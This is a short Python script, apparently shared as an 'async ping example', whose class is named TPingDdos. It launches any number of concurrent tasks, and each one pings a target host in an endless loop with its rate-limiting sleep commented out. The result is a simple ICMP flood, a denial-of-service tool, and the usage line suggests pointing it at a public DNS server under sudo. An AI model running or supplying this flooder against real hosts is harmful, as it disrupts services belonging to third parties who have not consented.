'''
python async ping example
VladVons@gmail.com
2022.04.28OB
'''

import sys
import asyncio
import aioping


class TPingDdos():
    async def Ping(self, aHost: str):
        try:
            Delay = await aioping.ping(aHost)
            return round(Delay * 1000, 2)
        except TimeoutError:
            return -1

    async def PingEver(self, aHost: str, aTaskId: int):
        Cnt = 0
        while (True):
            Delay = await self.Ping(aHost)

            Cnt += 1
            if (Cnt % 100 == 0):
                print('time: %sms, id %s:, cnt: %s' % (Delay, aTaskId, Cnt))

            #await asyncio.sleep(0.01)

    async def Run(self, aHost: str, aCnt: int):
        print('gathering %s tasks ...' % (aCnt))
        Tasks = [asyncio.create_task(self.PingEver(aHost, i)) for i in range(aCnt)]
        await asyncio.gather(*Tasks)


if (__name__ == '__main__'):
    if (len(sys.argv) == 3):
        App, Host, Count = sys.argv
        Task = TPingDdos().Run(Host, int(Count))
        asyncio.run(Task)
    else:
        print('Syntax ex.: sudo python3 PingDdos.py 8.8.8.8 100')
